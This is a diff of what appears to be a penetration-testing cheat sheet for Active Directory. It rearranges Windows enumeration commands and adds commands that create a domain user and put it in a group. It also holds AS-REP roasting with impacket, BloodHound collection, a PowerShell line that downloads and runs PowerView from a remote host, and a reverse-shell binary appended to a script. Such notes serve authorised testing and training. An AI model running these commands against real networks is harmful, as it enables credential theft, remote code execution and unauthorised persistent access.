@@ -646,20 +646,37 @@ upload {FILE.exe}
 
 ```bash
 
+# Enumerate all local accounts
+net user
+
+# Enumerate entire domain
+net user /domain
+
+# Enumerate information about user
+net user {USERNAME} /domain
+
+# Enumerate all groups in domain
+net group /domain
+
 # ASREP ROAST
 python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py -request {DOMAIN1}.{DOMAIN2}/ -dc-ip {IP ADDRESS} -format hashcat
 
 python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py {DOMAIN1}.{DOMAIN2}/ -dc-ip {IP ADDRESS} -userfile {USER.txt} -format hashcat
 
-
 # Bloodhound
 sudo ./usr/bin/neo4j console
 
-# RHOST
+RHOST
 ./sharphound.exe -c all
 
-# LHOST
+LHOST
 ./BloodHound  --no-sandbox
+
+# Add user
+net user {USERNAME} {PASSWORD} /add /domain
+
+# Add user to group
+net group "{GROUP}" {USERNAME} /add
 
 IEX(New-Object Net.WebClient).downloadstring("http://{IP ADDRESS}/PowerView.ps1")
 $pass = convertto-securestring '{PASSWORD}' -AsPlainText -Force
@@ -1144,17 +1161,7 @@ echo C:\PrivEsc\reverse.exe >> C:\DevTools\CleanUp.ps1
 # Eumerate privileges
 whoami /all
 
-# Enumerate all local accounts
-net user
 
-# Enumerate entire domain
-net user /domain
-
-# Enumerate information about user
-net user {USERNAME} /domain
-
-# Enumerate all groups in domain
-net group /domain
 
 
 # PS
